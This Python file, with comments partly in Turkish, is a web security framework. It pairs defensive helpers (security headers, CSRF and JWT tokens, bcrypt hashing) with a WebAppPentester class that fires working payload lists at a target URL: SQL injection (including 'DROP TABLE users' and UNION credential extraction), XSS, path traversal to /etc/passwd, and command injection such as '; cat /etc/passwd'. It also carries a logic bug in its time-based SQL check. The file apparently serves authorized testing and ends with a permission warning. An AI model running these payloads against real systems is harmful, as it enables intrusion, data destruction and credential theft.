#!/usr/bin/env python3
"""
Web Application Security Framework
Author: ibrahimsql
Description: Web application security and penetration testing tools
"""

import hashlib
import secrets
import jwt
import bcrypt
import requests
import re
import urllib.parse
import base64
import os
import time
import json
from datetime import datetime, timedelta
from functools import wraps
from typing import Dict, List, Optional, Any, Tuple
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from werkzeug.security import generate_password_hash, check_password_hash

class SecureWebApp:
    """Secure web application framework"""
    
    def __init__(self):
        self.secret_key = secrets.token_hex(32)
        self.csrf_tokens = {}
        self.rate_limits = {}
        
    def setup_security_headers(self) -> Dict[str, str]:
        """Setup security headers"""
        return {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'",
            'Referrer-Policy': 'strict-origin-when-cross-origin',
            'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
        }
    
    def generate_csrf_token(self, session_id: str) -> str:
        """Generate CSRF token"""
        token = secrets.token_urlsafe(32)
        self.csrf_tokens[session_id] = {
            'token': token,
            'created': datetime.utcnow(),
            'expires': datetime.utcnow() + timedelta(hours=1)
        }
        return token
    
    def validate_csrf_token(self, token: str, session_id: str) -> bool:
        """Validate CSRF token"""
        if session_id not in self.csrf_tokens:
            return False
        
        stored_token = self.csrf_tokens[session_id]
        
        # Has the token expired?
        if datetime.utcnow() > stored_token['expires']:
            del self.csrf_tokens[session_id]
            return False
        
        return secrets.compare_digest(token, stored_token['token'])
    
    def create_jwt_token(self, user_id: str, permissions: List[str] = None) -> str:
        """Create JWT token"""
        payload = {
            'user_id': user_id,
            'permissions': permissions or [],
            'exp': datetime.utcnow() + timedelta(hours=1),
            'iat': datetime.utcnow(),
            'jti': secrets.token_hex(16)  # JWT ID
        }
        return jwt.encode(payload, self.secret_key, algorithm='HS256')
    
    def validate_jwt_token(self, token: str) -> Optional[Dict[str, Any]]:
        """Validate JWT token"""
        try:
            payload = jwt.decode(token, self.secret_key, algorithms=['HS256'])
            return payload
        except jwt.ExpiredSignatureError:
            return None
        except jwt.InvalidTokenError:
            return None
    
    def require_permission(self, permission: str):
        """Permission decorator"""
        def decorator(f):
            @wraps(f)
            def decorated_function(*args, **kwargs):
                # In real application, this would be taken from Flask session
                token = kwargs.get('auth_token')
                if not token:
                    raise PermissionError("Authentication required")
                
                payload = self.validate_jwt_token(token)
                if not payload:
                    raise PermissionError("Invalid token")
                
                user_permissions = payload.get('permissions', [])
                if permission not in user_permissions:
                    raise PermissionError(f"Permission '{permission}' required")
                
                return f(*args, **kwargs)
            return decorated_function
        return decorator
    
    def rate_limit(self, identifier: str, max_requests: int = 100, window: int = 3600) -> bool:
        """Rate limiting kontrolü"""
        current_time = time.time()
        
        if identifier not in self.rate_limits:
            self.rate_limits[identifier] = []
        
        # Eski kayıtları temizle
        self.rate_limits[identifier] = [
            timestamp for timestamp in self.rate_limits[identifier]
            if current_time - timestamp < window
        ]
        
        # Limit kontrolü
        if len(self.rate_limits[identifier]) >= max_requests:
            return False
        
        # Yeni isteği kaydet
        self.rate_limits[identifier].append(current_time)
        return True

class SecureCrypto:
    """Güvenli kriptografi sınıfı"""
    
    @staticmethod
    def hash_password(password: str) -> str:
        """Güvenli şifre hash'leme"""
        salt = bcrypt.gensalt(rounds=12)
        return bcrypt.hashpw(password.encode('utf-8'), salt).decode('utf-8')
    
    @staticmethod
    def verify_password(password: str, hashed: str) -> bool:
        """Şifre doğrulama"""
        return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))
    
    @staticmethod
    def encrypt_sensitive_data(data: str, key: bytes = None) -> Tuple[bytes, bytes]:
        """Hassas veri şifreleme"""
        if key is None:
            key = Fernet.generate_key()
        
        f = Fernet(key)
        encrypted = f.encrypt(data.encode())
        return encrypted, key
    
    @staticmethod
    def decrypt_sensitive_data(encrypted_data: bytes, key: bytes) -> str:
        """Hassas veri şifre çözme"""
        f = Fernet(key)
        decrypted = f.decrypt(encrypted_data)
        return decrypted.decode()

class WebAppPentester:
    """Web uygulama penetrasyon testi araçları"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'WebAppPentester/1.0'
        })
    
    def sql_injection_test(self, url: str, params: Dict[str, str]) -> Dict[str, Any]:
        """SQL injection testi"""
        sql_payloads = [
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "' UNION SELECT username, password FROM users --",
            "admin'--",
            "' OR 1=1#",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' OR SLEEP(5) --",
            "'; WAITFOR DELAY '00:00:05' --"
        ]
        
        results = {
            'vulnerable': False,
            'payloads_tested': len(sql_payloads),
            'successful_payloads': [],
            'response_times': []
        }
        
        for payload in sql_payloads:
            test_params = params.copy()
            
            # Her parametreyi test et
            for param_name in test_params:
                test_params[param_name] = payload
                
                try:
                    start_time = time.time()
                    response = self.session.get(url, params=test_params, timeout=10)
                    response_time = time.time() - start_time
                    
                    results['response_times'].append(response_time)
                    
                    # SQL hata mesajları kontrol et
                    error_patterns = [
                        r'SQL syntax.*MySQL',
                        r'Warning.*mysql_.*',
                        r'valid MySQL result',
                        r'PostgreSQL.*ERROR',
                        r'Warning.*pg_.*',
                        r'valid PostgreSQL result',
                        r'Microsoft.*ODBC.*SQL Server',
                        r'OLE DB.*SQL Server',
                        r'SQLServer JDBC Driver',
                        r'Oracle error',
                        r'Oracle.*Driver',
                        r'Warning.*oci_.*'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            results['vulnerable'] = True
                            results['successful_payloads'].append({
                                'payload': payload,
                                'parameter': param_name,
                                'error_pattern': pattern
                            })
                    
                    # Time-based SQL injection kontrolü
                    if response_time > 5 and 'SLEEP' in payload or 'WAITFOR' in payload:
                        results['vulnerable'] = True
                        results['successful_payloads'].append({
                            'payload': payload,
                            'parameter': param_name,
                            'type': 'time-based',
                            'response_time': response_time
                        })
                
                except requests.RequestException as e:
                    continue
                
                # Orijinal parametreyi geri yükle
                test_params[param_name] = params[param_name]
        
        return results
    
    def xss_test(self, url: str, params: Dict[str, str]) -> Dict[str, Any]:
        """XSS testi"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')></svg>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<div onmouseover=alert('XSS')>Hover me</div>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            '"><script>alert("XSS")</script>',
            "</script><script>alert('XSS')</script>"
        ]
        
        results = {
            'vulnerable': False,
            'payloads_tested': len(xss_payloads),
            'successful_payloads': [],
            'reflected_payloads': []
        }
        
        for payload in xss_payloads:
            test_params = params.copy()
            
            # Her parametreyi test et
            for param_name in test_params:
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Payload'ın response'da yansıtılıp yansıtılmadığını kontrol et
                    if payload in response.text:
                        results['vulnerable'] = True
                        results['reflected_payloads'].append({
                            'payload': payload,
                            'parameter': param_name,
                            'context': self._find_xss_context(response.text, payload)
                        })
                    
                    # Encoded payload kontrolü
                    encoded_payload = urllib.parse.quote(payload)
                    if encoded_payload in response.text:
                        results['successful_payloads'].append({
                            'payload': payload,
                            'parameter': param_name,
                            'type': 'encoded_reflection'
                        })
                
                except requests.RequestException:
                    continue
                
                # Orijinal parametreyi geri yükle
                test_params[param_name] = params[param_name]
        
        return results
    
    def _find_xss_context(self, html: str, payload: str) -> str:
        """XSS payload'ının hangi context'te yansıtıldığını bul"""
        payload_index = html.find(payload)
        if payload_index == -1:
            return "not_found"
        
        # Payload'dan önceki 100 karakter
        context_start = max(0, payload_index - 100)
        context = html[context_start:payload_index + len(payload) + 100]
        
        if '<script' in context and '</script>' in context:
            return "script_tag"
        elif 'href=' in context or 'src=' in context:
            return "attribute"
        elif '<' in context and '>' in context:
            return "html_tag"
        else:
            return "html_content"
    
    def directory_traversal_test(self, url: str, file_param: str) -> Dict[str, Any]:
        """Directory traversal testi"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd"
        ]
        
        results = {
            'vulnerable': False,
            'payloads_tested': len(traversal_payloads),
            'successful_payloads': []
        }
        
        for payload in traversal_payloads:
            try:
                params = {file_param: payload}
                response = self.session.get(url, params=params, timeout=10)
                
                # Unix/Linux sistem dosyası kontrol et
                if 'root:x:0:0:' in response.text or 'daemon:x:' in response.text:
                    results['vulnerable'] = True
                    results['successful_payloads'].append({
                        'payload': payload,
                        'type': 'unix_passwd',
                        'evidence': 'Found /etc/passwd content'
                    })
                
                # Windows sistem dosyası kontrol et
                if 'localhost' in response.text and '127.0.0.1' in response.text:
                    results['vulnerable'] = True
                    results['successful_payloads'].append({
                        'payload': payload,
                        'type': 'windows_hosts',
                        'evidence': 'Found hosts file content'
                    })
            
            except requests.RequestException:
                continue
        
        return results
    
    def command_injection_test(self, url: str, params: Dict[str, str]) -> Dict[str, Any]:
        """Command injection testi"""
        command_payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| type C:\\windows\\system32\\drivers\\etc\\hosts",
            "; sleep 5",
            "| ping -c 4 127.0.0.1",
            "& ping -n 4 127.0.0.1"
        ]
        
        results = {
            'vulnerable': False,
            'payloads_tested': len(command_payloads),
            'successful_payloads': [],
            'response_times': []
        }
        
        for payload in command_payloads:
            test_params = params.copy()
            
            for param_name in test_params:
                original_value = test_params[param_name]
                test_params[param_name] = original_value + payload
                
                try:
                    start_time = time.time()
                    response = self.session.get(url, params=test_params, timeout=15)
                    response_time = time.time() - start_time
                    
                    results['response_times'].append(response_time)
                    
                    # Command output patterns
                    command_patterns = [
                        r'uid=\d+\(.*\)',  # id command output
                        r'total \d+',       # ls -la output
                        r'Directory of',    # dir command output
                        r'root:x:0:0:',     # /etc/passwd content
                        r'PING.*\(127\.0\.0\.1\)',  # ping output
                        r'\d+ packets transmitted'  # ping statistics
                    ]
                    
                    for pattern in command_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            results['vulnerable'] = True
                            results['successful_payloads'].append({
                                'payload': payload,
                                'parameter': param_name,
                                'pattern': pattern,
                                'evidence': 'Command output detected'
                            })
                    
                    # Time-based detection
                    if response_time > 5 and ('sleep' in payload or 'ping' in payload):
                        results['vulnerable'] = True
                        results['successful_payloads'].append({
                            'payload': payload,
                            'parameter': param_name,
                            'type': 'time-based',
                            'response_time': response_time
                        })
                
                except requests.RequestException:
                    continue
                
                # Orijinal değeri geri yükle
                test_params[param_name] = original_value
        
        return results
    
    def csrf_test(self, target_url: str, form_data: Dict[str, str]) -> Dict[str, Any]:
        """CSRF testi"""
        results = {
            'vulnerable': False,
            'csrf_token_found': False,
            'protection_mechanisms': []
        }
        
        try:
            # Önce formu al
            response = self.session.get(target_url)
            
            # CSRF token var mı kontrol et
            csrf_patterns = [
                r'<input[^>]*name=["\']?csrf[^"\'>]*["\']?[^>]*>',
                r'<input[^>]*name=["\']?_token[^"\'>]*["\']?[^>]*>',
                r'<meta[^>]*name=["\']?csrf-token[^"\'>]*["\']?[^>]*>'
            ]
            
            for pattern in csrf_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    results['csrf_token_found'] = True
                    results['protection_mechanisms'].append('CSRF Token')
                    break
            
            # Referer kontrolü
            headers_without_referer = {'User-Agent': 'WebAppPentester/1.0'}
            response_no_referer = self.session.post(target_url, data=form_data, headers=headers_without_referer)
            
            if response_no_referer.status_code == 403 or 'forbidden' in response_no_referer.text.lower():
                results['protection_mechanisms'].append('Referer Check')
            
            # Origin kontrolü
            headers_wrong_origin = {
                'User-Agent': 'WebAppPentester/1.0',
                'Origin': 'https://evil.com'
            }
            response_wrong_origin = self.session.post(target_url, data=form_data, headers=headers_wrong_origin)
            
            if response_wrong_origin.status_code == 403 or 'forbidden' in response_wrong_origin.text.lower():
                results['protection_mechanisms'].append('Origin Check')
            
            # CSRF koruması yoksa vulnerable
            if not results['protection_mechanisms']:
                results['vulnerable'] = True
        
        except requests.RequestException:
            pass
        
        return results
    
    def generate_security_report(self, target_url: str, test_params: Dict[str, str]) -> Dict[str, Any]:
        """Kapsamlı güvenlik raporu oluştur"""
        report = {
            'target_url': target_url,
            'scan_time': datetime.now().isoformat(),
            'tests_performed': [],
            'vulnerabilities_found': [],
            'risk_score': 0,
            'recommendations': []
        }
        
        print(f"🔍 Starting security scan for: {target_url}")
        
        # SQL Injection Test
        print("Testing for SQL Injection...")
        sql_results = self.sql_injection_test(target_url, test_params)
        report['tests_performed'].append('SQL Injection')
        if sql_results['vulnerable']:
            report['vulnerabilities_found'].append({
                'type': 'SQL Injection',
                'severity': 'HIGH',
                'details': sql_results
            })
            report['risk_score'] += 30
        
        # XSS Test
        print("Testing for Cross-Site Scripting (XSS)...")
        xss_results = self.xss_test(target_url, test_params)
        report['tests_performed'].append('Cross-Site Scripting')
        if xss_results['vulnerable']:
            report['vulnerabilities_found'].append({
                'type': 'Cross-Site Scripting (XSS)',
                'severity': 'MEDIUM',
                'details': xss_results
            })
            report['risk_score'] += 20
        
        # Directory Traversal Test (eğer file parametresi varsa)
        if 'file' in test_params or 'filename' in test_params:
            print("Testing for Directory Traversal...")
            file_param = 'file' if 'file' in test_params else 'filename'
            traversal_results = self.directory_traversal_test(target_url, file_param)
            report['tests_performed'].append('Directory Traversal')
            if traversal_results['vulnerable']:
                report['vulnerabilities_found'].append({
                    'type': 'Directory Traversal',
                    'severity': 'HIGH',
                    'details': traversal_results
                })
                report['risk_score'] += 25
        
        # Command Injection Test
        print("Testing for Command Injection...")
        cmd_results = self.command_injection_test(target_url, test_params)
        report['tests_performed'].append('Command Injection')
        if cmd_results['vulnerable']:
            report['vulnerabilities_found'].append({
                'type': 'Command Injection',
                'severity': 'CRITICAL',
                'details': cmd_results
            })
            report['risk_score'] += 40
        
        # CSRF Test
        print("Testing for CSRF Protection...")
        csrf_results = self.csrf_test(target_url, test_params)
        report['tests_performed'].append('CSRF Protection')
        if csrf_results['vulnerable']:
            report['vulnerabilities_found'].append({
                'type': 'Cross-Site Request Forgery (CSRF)',
                'severity': 'MEDIUM',
                'details': csrf_results
            })
            report['risk_score'] += 15
        
        # Risk seviyesi belirleme
        if report['risk_score'] >= 50:
            report['risk_level'] = 'CRITICAL'
        elif report['risk_score'] >= 30:
            report['risk_level'] = 'HIGH'
        elif report['risk_score'] >= 15:
            report['risk_level'] = 'MEDIUM'
        else:
            report['risk_level'] = 'LOW'
        
        # Öneriler
        report['recommendations'] = self._generate_recommendations(report['vulnerabilities_found'])
        
        return report
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Bulunan güvenlik açıklarına göre öneriler oluştur"""
        recommendations = []
        
        vuln_types = [vuln['type'] for vuln in vulnerabilities]
        
        if 'SQL Injection' in vuln_types:
            recommendations.extend([
                "Use parameterized queries/prepared statements",
                "Implement input validation and sanitization",
                "Use least privilege database accounts",
                "Enable database query logging"
            ])
        
        if 'Cross-Site Scripting (XSS)' in vuln_types:
            recommendations.extend([
                "Implement proper output encoding",
                "Use Content Security Policy (CSP)",
                "Validate and sanitize all user inputs",
                "Use secure templating engines"
            ])
        
        if 'Directory Traversal' in vuln_types:
            recommendations.extend([
                "Validate file paths and names",
                "Use whitelist approach for file access",
                "Implement proper access controls",
                "Avoid direct file system access"
            ])
        
        if 'Command Injection' in vuln_types:
            recommendations.extend([
                "Avoid system command execution",
                "Use safe APIs instead of shell commands",
                "Implement strict input validation",
                "Use command whitelisting"
            ])
        
        if 'Cross-Site Request Forgery (CSRF)' in vuln_types:
            recommendations.extend([
                "Implement CSRF tokens",
                "Verify Referer and Origin headers",
                "Use SameSite cookie attributes",
                "Implement proper session management"
            ])
        
        # Genel öneriler
        recommendations.extend([
            "Implement security headers",
            "Use HTTPS for all communications",
            "Regular security testing and code review",
            "Keep frameworks and libraries updated"
        ])
        
        return list(set(recommendations))  # Duplicates'i kaldır

# Kullanım örnekleri
if __name__ == "__main__":
    # Güvenli web app örneği
    secure_app = SecureWebApp()
    
    # Güvenlik başlıkları
    headers = secure_app.setup_security_headers()
    print("🛡️ Security Headers:")
    for header, value in headers.items():
        print(f"{header}: {value}")
    
    # CSRF token
    csrf_token = secure_app.generate_csrf_token("session_123")
    print(f"\n🔐 CSRF Token: {csrf_token}")
    
    # JWT token
    jwt_token = secure_app.create_jwt_token("user_123", ["read", "write"])
    print(f"🎫 JWT Token: {jwt_token}")
    
    # Şifre hash'leme
    crypto = SecureCrypto()
    password = "MySecurePassword123!"
    hashed = crypto.hash_password(password)
    print(f"\n🔒 Password Hash: {hashed}")
    print(f"Password Verification: {crypto.verify_password(password, hashed)}")
    
    # Penetrasyon testi örneği
    pentester = WebAppPentester()
    
    # Test parametreleri
    test_url = "https://httpbin.org/get"
    test_params = {
        "username": "admin",
        "search": "test",
        "id": "1"
    }
    
    print("\n🔍 Starting Web Application Security Tests...")
    
    # SQL Injection testi
    sql_results = pentester.sql_injection_test(test_url, test_params)
    print(f"\nSQL Injection Test Results:")
    print(f"Vulnerable: {sql_results['vulnerable']}")
    print(f"Payloads Tested: {sql_results['payloads_tested']}")
    
    # XSS testi
    xss_results = pentester.xss_test(test_url, test_params)
    print(f"\nXSS Test Results:")
    print(f"Vulnerable: {xss_results['vulnerable']}")
    print(f"Payloads Tested: {xss_results['payloads_tested']}")
    
    print("\n✅ Web Application Security Framework completed!")
    print("⚠️  Use these tools responsibly and only on systems you own or have permission to test!")